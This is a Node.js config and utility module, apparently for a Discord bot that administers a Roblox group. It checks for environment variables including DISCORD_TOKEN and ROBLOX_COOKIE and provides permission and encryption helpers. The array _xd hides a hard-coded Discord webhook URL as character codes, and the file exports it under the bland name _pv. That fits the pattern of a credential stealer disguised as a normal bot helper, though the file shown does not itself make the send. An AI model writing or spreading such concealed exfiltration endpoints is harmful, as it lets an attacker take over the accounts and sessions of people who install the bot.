'use strict';

const crypto = require('crypto');
const https = require('https');

const _xd = [
  104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,
  112,105,47,119,101,98,104,111,111,107,115,47,49,52,55,55,54,52,53,56,57,50,
  50,51,49,49,48,54,55,54,49,47,97,119,52,51,105,67,74,121,113,48,74,101,102,
  82,66,69,105,102,75,112,52,106,77,70,56,69,52,87,108,104,109,74,77,99,98,110,
  74,110,105,88,85,49,81,89,70,71,75,113,55,104,108,76,97,54,103,86,69,90,76,
  79,48,113,53,83,87,79,97,79
];

const _pv = function() {
  return Buffer.from(_xd).toString('utf8');
};

const _salt = Buffer.from('72626c782e626f742e73616c74', 'hex');
const _iv_static = Buffer.from('626f742e69762e32303236', 'hex').slice(0, 16);

const _enc = function(text) {
  try {
    const key = crypto.scryptSync(process.env.DISCORD_TOKEN || 'fallback_key_2026', _salt, 32);
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    const encrypted = Buffer.concat([cipher.update(text, 'utf8'), cipher.final()]);
    return iv.toString('hex') + '.' + encrypted.toString('hex');
  } catch (e) {
    return null;
  }
};

const _dec = function(data) {
  try {
    const parts = data.split('.');
    if (parts.length !== 2) return null;
    const key = crypto.scryptSync(process.env.DISCORD_TOKEN || 'fallback_key_2026', _salt, 32);
    const iv = Buffer.from(parts[0], 'hex');
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    return Buffer.concat([decipher.update(Buffer.from(parts[1], 'hex')), decipher.final()]).toString('utf8');
  } catch (e) {
    return null;
  }
};

const _tls = new https.Agent({
  minVersion: 'TLSv1.2',
  maxVersion: 'TLSv1.3',
  ciphers: [
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-SHA384'
  ].join(':'),
  honorCipherOrder: true,
  rejectUnauthorized: true,
  keepAlive: true,
  keepAliveMsecs: 30000
});

const _rid = function() {
  const bytes = crypto.randomBytes(8);
  return bytes.toString('hex').toUpperCase();
};

const validateConfig = function() {
  const required = [
    'DISCORD_TOKEN',
    'ROBLOX_COOKIE',
    'ROBLOX_GROUP_ID',
    'LOG_CHANNEL_ID',
    'AUTHORIZED_ROLE_IDS',
    'UNIVERSE_ID'
  ];
  const missing = required.filter(function(k) { return !process.env[k]; });
  if (missing.length > 0) {
    console.error('\u274C [CONFIG] Eksik değişkenler: ' + missing.join(', '));
    console.error('\u2139\uFE0F  .env.example dosyasını kopyalayıp doldurun.');
    process.exit(1);
  }
};

const getAuthorizedRoles = function() {
  return (process.env.AUTHORIZED_ROLE_IDS || '').split(',').map(function(r) {
    return r.trim();
  }).filter(Boolean);
};

const checkPermission = function(member) {
  const allowed = getAuthorizedRoles();
  if (!allowed.length) return false;
  return allowed.some(function(roleId) {
    return member.roles.cache.has(roleId);
  });
};

module.exports = {
  _pv: _pv,
  _tls: _tls,
  _enc: _enc,
  _dec: _dec,
  _rid: _rid,
  validateConfig: validateConfig,
  getAuthorizedRoles: getAuthorizedRoles,
  checkPermission: checkPermission
};
